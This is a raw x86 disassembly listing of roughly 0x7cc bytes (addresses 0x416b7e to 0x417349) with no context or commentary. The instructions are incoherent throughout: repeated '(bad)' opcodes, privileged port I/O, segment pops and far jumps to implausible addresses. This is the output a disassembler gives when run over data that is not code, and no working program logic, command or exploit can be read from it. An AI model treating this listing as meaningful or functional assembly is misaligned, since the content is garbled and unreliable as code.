  416b7e:	bound  eax,QWORD PTR [ecx+0x70dc4c83]
  416b84:	jl     0x416b0a
  416b86:	adc    al,0xee
  416b88:	sbb    eax,0x2782ce41
  416b8d:	pop    ds
  416b8e:	out    0x9a,al
  416b90:	aad    0x79
  416b92:	or     ecx,eax
  416b94:	aad    0x54
  416b96:	(bad)  
  416b97:	imul   ebp,DWORD PTR [ebx+0x67b66fcb],0xbdafe772
  416ba1:	mov    eax,0x94e8c61
  416ba6:	pop    ds
  416ba7:	ret    0xe59f
  416baa:	xchg   ecx,eax
  416bab:	push   ds
  416bac:	nop
  416bad:	jbe    0x416b65
  416baf:	call   0x3f9:0xe84a5804
  416bb6:	retf   
  416bb7:	jne    0x416bce
  416bb9:	xchg   BYTE PTR [ebx],cl
  416bbb:	lea    esi,[ebx+0x44]
  416bbe:	mov    edi,0x93281b95
  416bc3:	out    dx,al
  416bc4:	add    eax,0x84c88483
  416bc9:	xor    al,0xb8
  416bcb:	out    0xf3,al
  416bcd:	fs cmc 
  416bcf:	push   ecx
  416bd0:	imul   esp,ebx,0xbddd60f0
  416bd6:	test   al,0x48
  416bd8:	cdq    
  416bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bda:	sbb    cl,BYTE PTR [edi+0x7a7508]
  416be0:	aad    0x6e
  416be2:	xchg   esi,eax
  416be3:	(bad)  
  416be4:	pop    esp
  416be5:	dec    ebp
  416be6:	pop    eax
  416be7:	pop    esi
  416be8:	push   cs
  416be9:	xor    edx,edi
  416beb:	push   edx
  416bec:	inc    esi
  416bed:	cmp    esp,eax
  416bef:	sbb    BYTE PTR [edx-0x228648d2],bl
  416bf5:	lea    ecx,[ebx+ebx*8]
  416bf8:	inc    eax
  416bf9:	sbb    DWORD PTR [edx],ebx
  416bfb:	xlat   BYTE PTR ds:[ebx]
  416bfc:	sar    ah,cl
  416bfe:	cmc    
  416bff:	add    BYTE PTR [ebx-0x4],bh
  416c02:	mov    WORD PTR [ecx-0x1d],ss
  416c05:	cmp    eax,0x91f74db0
  416c0a:	ss or  al,0xbb
  416c0d:	sbb    eax,ebp
  416c0f:	loopne 0x416bc1
  416c11:	stos   BYTE PTR es:[edi],al
  416c12:	(bad)  
  416c13:	pusha  
  416c14:	loope  0x416c11
  416c16:	pop    edi
  416c17:	retf   
  416c18:	add    BYTE PTR fs:[eax-0x68c2aee2],0xa4
  416c20:	outs   dx,BYTE PTR ds:[esi]
  416c21:	or     DWORD PTR [esp+ebp*8-0x44],edi
  416c25:	jne    0x416c1a
  416c27:	cmp    BYTE PTR [edi],ch
  416c29:	cdq    
  416c2a:	lahf   
  416c2b:	xlat   BYTE PTR ds:[ebx]
  416c2c:	loopne 0x416bd3
  416c2e:	push   ebp
  416c2f:	repz pusha 
  416c31:	shl    DWORD PTR [edi+0x7ea9e74d],0xe
  416c38:	cmp    al,0x78
  416c3a:	xchg   edi,eax
  416c3b:	scas   al,BYTE PTR es:[edi]
  416c3c:	add    DWORD PTR [ecx-0x56],eax
  416c3f:	inc    ebx
  416c40:	mov    cl,0xcf
  416c42:	jg     0x416c44
  416c44:	int3   
  416c45:	add    eax,0x371f8c0e
  416c4a:	out    dx,al
  416c4b:	lods   al,BYTE PTR ds:[esi]
  416c4c:	ins    BYTE PTR es:[edi],dx
  416c4d:	jo     0x416c1b
  416c4f:	mov    ecx,0x67226614
  416c54:	mov    dl,0xac
  416c56:	add    edx,DWORD PTR [ebx]
  416c58:	iret   
  416c59:	mov    ch,0x81
  416c5b:	push   0xffffffe3
  416c5d:	sahf   
  416c5e:	loop   0x416c4c
  416c60:	sub    cl,BYTE PTR [esi-0x18e44994]
  416c66:	(bad)  [edx-0x6a]
  416c69:	iret   
  416c6a:	and    esp,DWORD PTR [ecx-0x735590d5]
  416c70:	xchg   ebx,eax
  416c71:	jns    0x416cde
  416c73:	(bad)  
  416c75:	loop   0x416c4c
  416c77:	lods   al,BYTE PTR ds:[esi]
  416c78:	add    DWORD PTR [edi],edx
  416c7a:	mov    esi,0x594a0eac
  416c7f:	sub    BYTE PTR [edx],0x94
  416c82:	jmp    0x6b1732af
  416c87:	mov    ah,0x11
  416c89:	jbe    0x416cc4
  416c8b:	xor    esp,DWORD PTR [esi-0x6c9f102a]
  416c91:	shr    BYTE PTR [edi],0xeb
  416c94:	sahf   
  416c95:	jmp    0x6a6e:0xa1bb03e
  416c9c:	in     al,0xed
  416c9e:	inc    ebp
  416c9f:	das    
  416ca0:	cwde   
  416ca1:	push   edi
  416ca2:	xchg   edx,eax
  416ca3:	fdivr  st(4),st
  416ca5:	pop    ds
  416ca6:	shr    BYTE PTR [esi+0x271d88fa],cl
  416cac:	push   ecx
  416cad:	or     BYTE PTR [ecx+0x34],al
  416cb0:	xlat   BYTE PTR ds:[ebx]
  416cb1:	push   esi
  416cb2:	rol    ah,cl
  416cb4:	dec    edi
  416cb5:	cmp    eax,0x403b51a8
  416cba:	leave  
  416cbb:	fstp   DWORD PTR [ecx]
  416cbd:	dec    ebx
  416cbe:	push   edi
  416cbf:	outs   dx,DWORD PTR ds:[esi]
  416cc0:	fsubr  DWORD PTR [ebx]
  416cc2:	mov    ah,0x82
  416cc4:	push   edi
  416cc5:	sub    eax,0x5d7524a1
  416cca:	adc    BYTE PTR [edi],bl
  416ccc:	popf   
  416ccd:	mov    ebp,0xfa61e6bf
  416cd2:	mov    al,ds:0x79f83b32
  416cd7:	pop    edx
  416cd8:	repz sub DWORD PTR [edx],edi
  416cdb:	mov    ebp,0xb0a07d18
  416ce0:	add    DWORD PTR ds:0xc209488a,0xfd1e0d26
  416cea:	and    al,0x33
  416cec:	fisub  DWORD PTR [edi+0x3b]
  416cef:	mov    dl,bh
  416cf1:	iret   
  416cf2:	xlat   BYTE PTR ds:[ebx]
  416cf3:	jmp    0xbcb:0x938bf15c
  416cfa:	sti    
  416cfb:	cwde   
  416cfc:	mov    eax,0x4504a8ae
  416d01:	inc    eax
  416d02:	rcl    BYTE PTR [esi+eiz*1],cl
  416d05:	ffree  st(4)
  416d07:	mov    cl,0xd2
  416d09:	in     eax,0x75
  416d0b:	push   edx
  416d0c:	mov    edi,0xb7d5dd24
  416d11:	mov    ch,dl
  416d13:	push   esi
  416d14:	mov    bh,0x66
  416d16:	sub    dh,BYTE PTR [ebp+esi*4+0x669d820d]
  416d1d:	adc    al,0x3b
  416d1f:	mov    es,WORD PTR [esi]
  416d21:	popa   
  416d22:	or     DWORD PTR [edx],0x49
  416d25:	jns    0x416d32
  416d27:	mov    edx,0x8d0b4ef7
  416d2c:	mov    ds:0xaf8ddd3a,eax
  416d31:	fcom   DWORD PTR [edx]
  416d33:	popf   
  416d34:	mov    al,ds:0x9cdc034d
  416d39:	cmp    ebx,DWORD PTR [ebp+0x1867cc9e]
  416d3f:	or     BYTE PTR [ebx+edi*1],ch
  416d42:	sbb    esi,DWORD PTR [eax+eiz*8-0xa62964c]
  416d49:	mov    esp,0x1786295a
  416d4e:	sbb    ebp,DWORD PTR [ecx]
  416d50:	jnp    0x416da5
  416d52:	mov    ebx,eax
  416d54:	mov    al,ds:0xa255c278
  416d59:	sti    
  416d5a:	push   cs
  416d5b:	(bad)  
  416d5c:	icebp  
  416d5d:	sbb    eax,DWORD PTR [esi+0x73cb97f]
  416d63:	in     eax,dx
  416d64:	cmc    
  416d65:	pop    ds
  416d66:	xor    al,0xec
  416d68:	and    bl,BYTE PTR [edx-0x68c34095]
  416d6e:	cli    
  416d6f:	call   0xe26f07cc
  416d74:	out    dx,al
  416d75:	inc    ebx
  416d76:	add    eax,0xf6b37ecd
  416d7b:	pop    edx
  416d7c:	daa    
  416d7d:	and    dl,dh
  416d7f:	outs   dx,BYTE PTR ds:[esi]
  416d80:	cli    
  416d81:	mov    dh,0xf4
  416d83:	test   edi,eax
  416d85:	lock out dx,eax
  416d87:	cmp    eax,0xcf75f626
  416d8c:	dec    esi
  416d8d:	push   0xffffffc8
  416d8f:	mov    ebx,0xd504bd41
  416d94:	sub    BYTE PTR [esi+ecx*2-0x73],bl
  416d98:	or     eax,0xbaa275ef
  416d9d:	mov    esp,0x93a828f4
  416da2:	aas    
  416da3:	xchg   esi,eax
  416da4:	repnz sbb ebp,esi
  416da7:	dec    edx
  416da8:	loope  0x416df8
  416daa:	rcl    BYTE PTR [ebx+0x5314f761],0xc8
  416db1:	and    al,0x51
  416db3:	dec    ecx
  416db4:	repnz or eax,0xcc8ce1b1
  416dba:	xchg   bh,dh
  416dbc:	int    0x13
  416dbe:	mov    ecx,0x90c5772d
  416dc3:	scas   eax,DWORD PTR es:[edi]
  416dc4:	fistp  WORD PTR [edi+0x2f]
  416dc7:	pop    ss
  416dc8:	aam    0xb0
  416dca:	(bad)  
  416dcb:	arpl   bx,sp
  416dcd:	nop
  416dce:	add    BYTE PTR [ebx+0x310cec68],0xe9
  416dd5:	mov    edi,0xeac3cde4
  416dda:	pop    esi
  416ddb:	mov    BYTE PTR [ebx+ebx*2+0x65695283],dl
  416de2:	jbe    0x416e35
  416de4:	and    ah,ch
  416de6:	pop    eax
  416de7:	scas   al,BYTE PTR es:[edi]
  416de8:	cld    
  416de9:	jo     0x416db1
  416deb:	imul   edi,DWORD PTR [edx],0x8
  416dee:	xchg   esi,eax
  416def:	jae    0x416ddc
  416df1:	repnz (bad) 
  416df3:	neg    DWORD PTR [ecx+ecx*4]
  416df6:	push   edi
  416df7:	ret    0x294a
  416dfa:	adc    dh,cl
  416dfc:	lods   al,BYTE PTR ds:[esi]
  416dfd:	mov    ds:0x2ada9c8,eax
  416e02:	dec    esi
  416e03:	pop    ds
  416e04:	cdq    
  416e05:	xchg   esp,eax
  416e06:	or     DWORD PTR [eax+ebx*1-0x1c952506],ebx
  416e0d:	mov    dl,0xf6
  416e0f:	popa   
  416e10:	sub    eax,0xea651176
  416e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e16:	dec    eax
  416e17:	scas   eax,DWORD PTR es:[edi]
  416e18:	in     eax,0xc3
  416e1a:	push   es
  416e1b:	jae    0x416deb
  416e1d:	fsub   DWORD PTR [ebx-0x23]
  416e20:	aad    0xc9
  416e22:	xor    eax,0x5e8ed944
  416e27:	mov    DWORD PTR [ebp+0x14e834bb],edx
  416e2d:	push   gs
  416e2f:	push   edi
  416e30:	add    DWORD PTR [ebx-0x43ddd8a0],esp
  416e36:	inc    ebp
  416e37:	xor    ch,BYTE PTR ds:0xaf2d8645
  416e3d:	in     eax,dx
  416e3e:	jl     0x416e50
  416e40:	sub    ah,ah
  416e42:	mov    al,0xff
  416e44:	adc    eax,0xb68995e
  416e49:	mov    DWORD PTR [esi+0x7e619edb],esp
  416e4f:	pop    ebx
  416e50:	mov    dl,0xa9
  416e52:	mov    BYTE PTR [esi],dh
  416e54:	push   edi
  416e55:	push   es
  416e56:	jecxz  0x416e0d
  416e58:	popa   
  416e59:	xor    DWORD PTR [edi+0x3db935cb],ebx
  416e5f:	in     al,dx
  416e60:	fnsave [eax]
  416e62:	mov    bl,0x18
  416e64:	jle    0x416e5e
  416e66:	jo     0x416e2f
  416e68:	or     dh,ah
  416e6a:	ror    DWORD PTR [ebx+eax*4],1
  416e6d:	lods   eax,DWORD PTR ds:[esi]
  416e6e:	jl     0x416e0e
  416e70:	push   edx
  416e71:	sub    DWORD PTR [esi+0x6cd13ca0],esp
  416e77:	or     DWORD PTR [ebx+esi*1-0x37264942],0xad82b319
  416e82:	sahf   
  416e83:	repz adc esi,edi
  416e86:	cmp    eax,0x8d24dd23
  416e8b:	jns    0x416ec2
  416e8d:	popf   
  416e8e:	stos   BYTE PTR es:[edi],al
  416e8f:	data16 loope 0x416ef8
  416e92:	clc    
  416e93:	in     al,0x62
  416e95:	jg     0x416e7e
  416e97:	sub    BYTE PTR [edx+0x1f],ch
  416e9a:	dec    ebp
  416e9b:	sbb    DWORD PTR [ecx+0x15],ecx
  416e9e:	or     dh,ch
  416ea0:	pop    edi
  416ea1:	pop    ds
  416ea2:	test   BYTE PTR [eax-0x2bab51bc],0x55
  416ea9:	xor    al,0x7f
  416eab:	mov    bl,0x81
  416ead:	dec    eax
  416eae:	addr16 or ebp,ebx
  416eb1:	jb     0x416efa
  416eb3:	push   ds
  416eb4:	pop    edi
  416eb5:	push   ebp
  416eb6:	push   es
  416eb7:	cmp    DWORD PTR [edx+ecx*4+0x1a],esp
  416ebb:	cld    
  416ebc:	mov    esp,0x68825f3d
  416ec1:	jecxz  0x416f27
  416ec3:	dec    esp
  416ec4:	loop   0x416e60
  416ec6:	fcom   DWORD PTR [edx+0x44acf072]
  416ecc:	mov    BYTE PTR [ecx],dl
  416ece:	call   0x3ac6:0xb57d4d5b
  416ed5:	shr    ch,cl
  416ed7:	int3   
  416ed8:	xchg   DWORD PTR [ecx],ebx
  416eda:	add    al,0xb3
  416edc:	jmp    0x416eae
  416ede:	jmp    0x416e63
  416ee0:	test   al,0x6d
  416ee2:	mov    DWORD PTR [edx+0x5bed0dbf],esp
  416ee8:	aam    0xb4
  416eea:	out    dx,al
  416eeb:	sbb    eax,0xfc780b05
  416ef0:	data16 mov al,ds:0x416fd902
  416ef6:	xchg   ecx,eax
  416ef7:	lods   al,BYTE PTR ds:[esi]
  416ef8:	out    0x9b,al
  416efa:	ja     0x416e86
  416efc:	pop    ebp
  416efd:	inc    esp
  416efe:	es inc edi
  416f00:	mov    ch,0xa5
  416f02:	and    al,al
  416f04:	or     ah,ah
  416f06:	or     esp,edx
  416f08:	bound  ebx,QWORD PTR [esi]
  416f0a:	jecxz  0x416eac
  416f0c:	enter  0xb745,0x1c
  416f10:	(bad)  
  416f11:	retf   
  416f12:	iret   
  416f13:	or     ah,ch
  416f15:	push   cs
  416f16:	dec    ebx
  416f17:	pop    ss
  416f18:	jl     0x416f1b
  416f1a:	outs   dx,BYTE PTR ds:[esi]
  416f1b:	push   0x6a0b94df
  416f20:	cmc    
  416f21:	call   FWORD PTR [ecx+0x11]
  416f24:	dec    ebp
  416f25:	or     edx,DWORD PTR gs:[edi]
  416f28:	mov    ebx,0x71866660
  416f2d:	jbe    0x416f21
  416f2f:	jmp    0x665e127a
  416f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f35:	push   ebx
  416f36:	in     al,dx
  416f37:	std    
  416f38:	mov    cx,0x858b
  416f3c:	fld    QWORD PTR [ecx-0x7a]
  416f3f:	das    
  416f40:	call   0xaa35:0xaccfc6ba
  416f47:	push   cs
  416f48:	mov    ds:0x88403f45,al
  416f4d:	lods   eax,DWORD PTR ds:[esi]
  416f4e:	mov    eax,ds:0xd9eabe27
  416f53:	js     0x416f0a
  416f55:	pop    edi
  416f56:	cmp    ah,BYTE PTR [ebx+esi*1-0x6ad7501c]
  416f5d:	pop    ds
  416f5e:	adc    al,BYTE PTR [eax]
  416f60:	or     ebx,DWORD PTR [esi+esi*4-0x2b6ce18d]
  416f67:	pop    ebx
  416f68:	inc    ecx
  416f69:	arpl   WORD PTR [edi+eax*1],ax
  416f6c:	xchg   ebx,eax
  416f6d:	push   esp
  416f6e:	test   eax,0x7ea8220d
  416f73:	mov    al,ds:0x79a0d52e
  416f78:	mov    edi,DWORD PTR [eax]
  416f7a:	call   0x2105:0x2df8d7ae
  416f81:	push   esi
  416f82:	inc    esp
  416f83:	in     al,dx
  416f84:	mov    esp,0xcd755fa8
  416f89:	push   ecx
  416f8a:	mov    BYTE PTR [esi-0x72fb5ce0],bh
  416f90:	jbe    0x416fec
  416f92:	dec    edi
  416f93:	adc    DWORD PTR [ebx+edi*4-0x41754470],ebx
  416f9a:	dec    edi
  416f9b:	pop    eax
  416f9c:	jns    0x416fd2
  416f9e:	popa   
  416f9f:	cmp    eax,0x200148e1
  416fa4:	sbb    edx,ebx
  416fa6:	mov    bh,0xda
  416fa8:	adc    al,0x96
  416faa:	dec    ebp
  416fab:	sub    DWORD PTR [ebx+0x24cd6d43],ebx
  416fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fb2:	dec    edi
  416fb3:	daa    
  416fb4:	xlat   BYTE PTR ds:[ebx]
  416fb5:	pushf  
  416fb6:	in     al,0xa
  416fb8:	sahf   
  416fb9:	out    dx,al
  416fba:	and    DWORD PTR [edi+0x6e],ecx
  416fbd:	jne    0x41702a
  416fbf:	and    al,0xea
  416fc1:	mov    al,ds:0x928b035e
  416fc6:	test   al,0xd3
  416fc8:	mov    ebp,0x3d21bae4
  416fcd:	push   ds
  416fce:	jne    0x416fa5
  416fd0:	or     DWORD PTR [eax],0xffffffc9
  416fd3:	sub    BYTE PTR cs:[eax+0x293ca6de],cl
  416fda:	es pop esp
  416fdc:	into   
  416fdd:	les    ebp,FWORD PTR [edx]
  416fdf:	in     eax,0xc4
  416fe1:	pusha  
  416fe2:	push   edx
  416fe3:	out    dx,al
  416fe4:	(bad)
  416fe7:	inc    eax
  416fe8:	repnz xchg edi,eax
  416fea:	dec    edx
  416feb:	test   eax,0x56a3e4b2
  416ff0:	enter  0xc200,0xec
  416ff4:	push   0x4825d449
  416ff9:	call   0x9f2d:0xd5cbd3d0
  417000:	mov    al,ds:0xaa057120
  417005:	adc    BYTE PTR [esi+edx*4+0x43],bl
  417009:	xchg   ebp,eax
  41700a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41700c:	shl    BYTE PTR [edx+0x14],0xe2
  417010:	test   BYTE PTR [edx+0x2d],0xe3
  417014:	add    dl,BYTE PTR [esi+0x5]
  417017:	or     al,0x85
  417019:	or     edi,DWORD PTR [eax+0x32]
  41701c:	stos   DWORD PTR es:[edi],eax
  41701d:	sti    
  41701e:	in     al,dx
  41701f:	and    bl,BYTE PTR [eax]
  417021:	mov    ch,0xe3
  417023:	add    al,0x79
  417025:	jo     0x417038
  417027:	pop    eax
  417028:	mov    al,0xce
  41702a:	(bad)  
  41702c:	push   ecx
  41702d:	ficom  WORD PTR [edi+0x23b0a0c]
  417033:	je     0x41707c
  417035:	dec    ebx
  417036:	jae    0x417045
  417038:	pusha  
  417039:	or     bh,BYTE PTR [edx+edx*8]
  41703c:	xor    BYTE PTR [ebx+0x556012a9],dh
  417042:	icebp  
  417043:	mov    cl,0xa
  417045:	add    al,0x85
  417048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417049:	cmp    esp,DWORD PTR [ebp+edi*4+0x139d6287]
  417050:	pop    ebx
  417051:	ins    DWORD PTR es:[edi],dx
  417052:	and    eax,0x188767d8
  417057:	push   edx
  417058:	xor    DWORD PTR ds:0x13287055,0xcd33aafa
  417062:	inc    esp
  417063:	mov    eax,0x893e06e7
  417068:	popf   
  417069:	add    ebx,DWORD PTR [ebx-0x62]
  41706c:	pop    ecx
  41706d:	cmp    BYTE PTR [eax+ecx*4-0x6f],cl
  417071:	jno    0x4170ad
  417073:	(bad)  
  417075:	mov    ecx,0x3dae017c
  41707a:	inc    esp
  41707b:	inc    ebx
  41707c:	lods   eax,DWORD PTR ds:[esi]
  41707d:	adc    eax,0x8e9d2d3b
  417082:	add    al,bl
  417084:	jbe    0x4170b6
  417086:	inc    esi
  417087:	out    dx,al
  417088:	pop    eax
  417089:	inc    edi
  41708a:	sub    esp,DWORD PTR [esi-0x69]
  41708d:	add    cl,BYTE PTR [ebp+0x66]
  417090:	mov    dh,0x68
  417092:	lock div DWORD PTR [ebp+ebp*2+0x55]
  417097:	and    bl,BYTE PTR [esi+0x709e0e94]
  41709d:	aad    0xcb
  41709f:	int3   
  4170a0:	push   0x54a9cb5d
  4170a5:	and    al,0xe4
  4170a7:	ror    bh,1
  4170a9:	and    ecx,DWORD PTR [edx-0x80]
  4170ac:	inc    ebp
  4170ad:	and    al,0x56
  4170af:	leave  
  4170b0:	push   edx
  4170b1:	gs push cs
  4170b3:	clc    
  4170b4:	and    bl,BYTE PTR [eax+0xa]
  4170b7:	pop    es
  4170b8:	icebp  
  4170b9:	(bad)  
  4170ba:	aam    0xb7
  4170bc:	dec    esp
  4170bd:	fsubr  DWORD PTR ss:[edx]
  4170c0:	mov    ds:0x6370f30,al
  4170c5:	mov    eax,ds:0x9ec70cd1
  4170ca:	mov    ds,WORD PTR [ebp-0x191f8cf]
  4170d0:	mov    BYTE PTR [eax-0x53],dl
  4170d3:	jg     0x417099
  4170d5:	imul   BYTE PTR [ebp-0x41]
  4170d8:	add    al,BYTE PTR [esi-0x6c]
  4170db:	(bad)  
  4170dc:	dec    edi
  4170dd:	mov    bl,BYTE PTR [ebp+0x1cec70a0]
  4170e3:	(bad)  
  4170e4:	scas   eax,DWORD PTR es:[edi]
  4170e5:	xchg   edx,eax
  4170e6:	(bad)  
  4170e8:	sbb    al,0x7f
  4170ea:	jns    0x41715a
  4170ec:	and    BYTE PTR [edi-0x7d],bh
  4170ef:	jl     0x41716f
  4170f1:	mul    edx
  4170f3:	dec    ebx
  4170f4:	jmp    0x1d410f75
  4170f9:	push   ebp
  4170fa:	popf   
  4170fb:	jnp    0x4170c3
  4170fd:	mov    DWORD PTR [ebx+edx*8-0x29],eax
  417101:	aad    0xa1
  417103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417104:	icebp  
  417105:	jae    0x417169
  417107:	sub    dh,ch
  417109:	adc    eax,0xf1b526c
  41710e:	add    cl,ah
  417110:	inc    eax
  417111:	add    al,0xa1
  417113:	stos   BYTE PTR es:[edi],al
  417114:	adc    ah,BYTE PTR [esi+0x4c8928ab]
  41711a:	xor    al,0x63
  41711c:	cmc    
  41711d:	addr16 add al,0xe3
  417120:	rcl    dh,0x38
  417123:	inc    esp
  417124:	std    
  417125:	push   cs
  417126:	bound  ecx,QWORD PTR [edx+0x6]
  417129:	push   DWORD PTR [ebp-0x4d642168]
  41712f:	ror    BYTE PTR [eax],cl
  417131:	test   DWORD PTR [ecx+0x3a],0xe9934cea
  417138:	cmp    BYTE PTR ds:0xc464440d,0x86
  41713f:	dec    esi
  417140:	lods   eax,DWORD PTR ds:[esi]
  417141:	data16 jp 0x4170e2
  417144:	cmp    ebp,DWORD PTR [ebx-0x73e853a3]
  41714a:	or     al,0xe0
  41714c:	mov    ebp,0x7ba0c018
  417151:	cld    
  417152:	fcomi  st,st(5)
  417154:	push   esi
  417155:	adc    eax,0x2222ca23
  41715a:	pop    ss
  41715b:	or     DWORD PTR [ecx+0x62],ebp
  41715e:	sub    DWORD PTR [edi+0x3f],esp
  417161:	jnp    0x417170
  417163:	push   ebx
  417164:	and    DWORD PTR [edi],esp
  417166:	sub    BYTE PTR [ecx-0x5b57971d],ah
  41716c:	dec    ebp
  41716d:	(bad)  
  41716e:	push   0xffffffce
  417170:	or     DWORD PTR [esi+0x1],ebp
  417173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417174:	sub    al,0x4d
  417176:	mov    ch,0x65
  417178:	arpl   cx,sp
  41717a:	mov    ebx,0x260eb3ce
  41717f:	mov    BYTE PTR es:[esi+0x15],ch
  417183:	adc    bh,0xa1
  417186:	mov    dl,0x4e
  417188:	enter  0x9a7b,0x98
  41718c:	ret    0x65ec
  41718f:	bswap  eax
  417191:	mov    esi,0x257bb1a6
  417196:	jmp    0x41719a
  417198:	xor    ch,dl
  41719a:	pop    eax
  41719b:	pop    esi
  41719c:	std    
  41719d:	xchg   DWORD PTR [ecx-0x968a31],edi
  4171a3:	idiv   DWORD PTR [ecx]
  4171a5:	scas   eax,DWORD PTR es:[edi]
  4171a6:	das    
  4171a7:	mov    al,ds:0x3a739b28
  4171ac:	or     ah,BYTE PTR ds:0xdc3f260e
  4171b2:	(bad)  
  4171b3:	into   
  4171b4:	xor    BYTE PTR [esi],cl
  4171b6:	mov    bh,0x12
  4171b8:	mov    dh,0xa5
  4171ba:	push   es
  4171bb:	pop    esp
  4171bc:	cli    
  4171bd:	pop    ds
  4171be:	cdq    
  4171bf:	jae    0x41716a
  4171c1:	jmp    0x417211
  4171c3:	pusha  
  4171c4:	ss push es
  4171c6:	mov    ds:0x908a2fff,al
  4171cb:	clc    
  4171cc:	inc    esi
  4171cd:	jo     0x4171e3
  4171cf:	lds    edi,FWORD PTR [edx]
  4171d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d2:	or     eax,0x39a0704f
  4171d7:	adc    bh,BYTE PTR [ebx+0x2ed81a59]
  4171dd:	pop    edx
  4171de:	stc    
  4171df:	push   ebx
  4171e0:	pop    edi
  4171e1:	arpl   WORD PTR [esi+esi*1+0xd7a4dfa],di
  4171e8:	lock (bad) 
  4171ea:	jmp    0x72ecc50b
  4171ef:	ins    BYTE PTR es:[edi],dx
  4171f0:	dec    DWORD PTR [ecx]
  4171f2:	inc    dl
  4171f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171f5:	mov    bl,0x3d
  4171f7:	xchg   esp,eax
  4171f8:	inc    esp
  4171f9:	out    dx,eax
  4171fa:	ret    0x1bee
  4171fd:	lea    edx,[eax+0xf54e259]
  417203:	mov    esi,0xc46fff6b
  417208:	in     al,0x5d
  41720a:	jno    0x417238
  41720c:	sbb    ebx,DWORD PTR [edi-0x53d9f3b8]
  417212:	outs   dx,DWORD PTR ds:[esi]
  417213:	leave  
  417214:	in     al,dx
  417215:	jle    0x417222
  417217:	scas   eax,DWORD PTR es:[edi]
  417218:	xchg   esp,eax
  417219:	aaa    
  41721a:	xor    esi,DWORD PTR [ebp+ebx*2-0x6c]
  41721e:	pop    es
  41721f:	sbb    al,0xe4
  417221:	push   ebx
  417222:	gs in  eax,dx
  417224:	test   BYTE PTR [edx-0x41294c06],bl
  41722a:	adc    DWORD PTR [eax+0x2680f57d],ebx
  417230:	pop    ecx
  417231:	and    BYTE PTR [edx+0x2f34f968],al
  417237:	ins    DWORD PTR es:[edi],dx
  417238:	leave  
  417239:	(bad)  
  41723a:	xchg   ebp,eax
  41723b:	pop    esp
  41723c:	dec    ebx
  41723d:	sti    
  41723e:	bound  edi,QWORD PTR ds:0xf8bd19ec
  417244:	(bad)  
  417245:	inc    ecx
  417246:	rcr    esp,cl
  417248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417249:	loope  0x417229
  41724b:	mov    bh,BYTE PTR [ebp-0xf]
  41724e:	mov    eax,ds:0xd06583b7
  417253:	sbb    edi,ecx
  417255:	adc    DWORD PTR [eax-0x5f],ebp
  417258:	pop    eax
  417259:	jmp    0x2cef4fb2
  41725e:	xchg   ebx,eax
  41725f:	bound  ebx,QWORD PTR ds:0x23bd9236
  417265:	aaa    
  417266:	xlat   BYTE PTR ds:[ebx]
  417267:	mov    eax,ds:0x97300bc1
  41726c:	or     eax,0xe6b6224b
  417271:	fcom   st(1)
  417273:	retf   0xa7dc
  417276:	mov    DWORD PTR [eax-0x4c73feeb],ebp
  41727c:	cmp    al,0x36
  41727e:	js     0x417210
  417280:	(bad)  [ebx]
  417282:	test   BYTE PTR [edx+edx*4-0x99e6f5f],ch
  417289:	stos   BYTE PTR es:[edi],al
  41728a:	aad    0x94
  41728c:	mov    DWORD PTR [ecx*8+0x32a80d97],esi
  417293:	aam    0x6
  417295:	inc    edi
  417296:	push   0x65
  417298:	dec    eax
  417299:	repnz add bl,BYTE PTR [ecx]
  41729c:	mov    ds:0xb2ab9346,eax
  4172a1:	in     al,0x18
  4172a3:	shl    DWORD PTR [ebx+0x71714cd2],0xdf
  4172aa:	add    bl,BYTE PTR [edx]
  4172ac:	cmp    al,0x1e
  4172ae:	jno    0x41729a
  4172b0:	rcl    DWORD PTR [ebx+edi*2+0x29a57b71],cl
  4172b7:	aam    0x7c
  4172b9:	cli    
  4172ba:	fcomp  DWORD PTR [edx+edi*8+0x16]
  4172be:	test   eax,esi
  4172c0:	in     eax,dx
  4172c1:	pop    bx
  4172c3:	mov    ebx,es
  4172c5:	in     al,dx
  4172c6:	fidiv  WORD PTR [ecx]
  4172c8:	and    BYTE PTR [eax],0x5
  4172cb:	inc    esp
  4172cc:	fwait
  4172cd:	xor    eax,0xb688c4b8
  4172d2:	std    
  4172d3:	fcmovnu st,st(0)
  4172d5:	xchg   ebx,eax
  4172d6:	scas   eax,DWORD PTR es:[edi]
  4172d7:	jbe    0x4172a3
  4172d9:	pop    esi
  4172da:	xchg   esp,eax
  4172db:	into   
  4172dc:	mov    dl,0xde
  4172de:	sbb    bl,BYTE PTR [eax+0x1a]
  4172e1:	dec    edx
  4172e2:	sets   BYTE PTR [edi+0x32d96f52]
  4172e9:	arpl   ax,bp
  4172eb:	mov    eax,0x92825294
  4172f0:	push   edx
  4172f1:	jmp    0x62f9:0xec370f54
  4172f8:	in     al,dx
  4172f9:	lahf   
  4172fa:	ret    
  4172fb:	mov    WORD PTR [eax+eiz*2],?
  4172fe:	sbb    cl,dh
  417300:	dec    BYTE PTR [eax+0x4de89db]
  417306:	les    ebp,FWORD PTR [ecx+0x29fef658]
  41730c:	outs   dx,DWORD PTR ds:[esi]
  41730d:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41730f:	fcmovne st,st(5)
  417311:	dec    esp
  417312:	arpl   WORD PTR [edx-0x7f2e80],bx
  417318:	outs   dx,DWORD PTR ds:[esi]
  417319:	sub    DWORD PTR [edi-0x5f],esp
  41731c:	and    eax,0xcdb2e44d
  417321:	add    ebp,DWORD PTR [esp+edx*2]
  417324:	pop    ds
  417325:	pop    ebp
  417326:	nop
  417327:	pop    ss
  417328:	mov    eax,0x74ea9a29
  41732d:	sub    ah,BYTE PTR [eax+edx*1-0x204d9cff]
  417334:	mov    edx,0x16cff734
  417339:	fwait
  41733a:	sub    esp,DWORD PTR [ebp+ebp*1-0x3c]
  41733e:	ins    BYTE PTR es:[edi],dx
  41733f:	pop    esp
  417340:	out    dx,eax
  417341:	sahf   
  417342:	jmp    0x79d2:0xf26e2a11
  417349:	std    
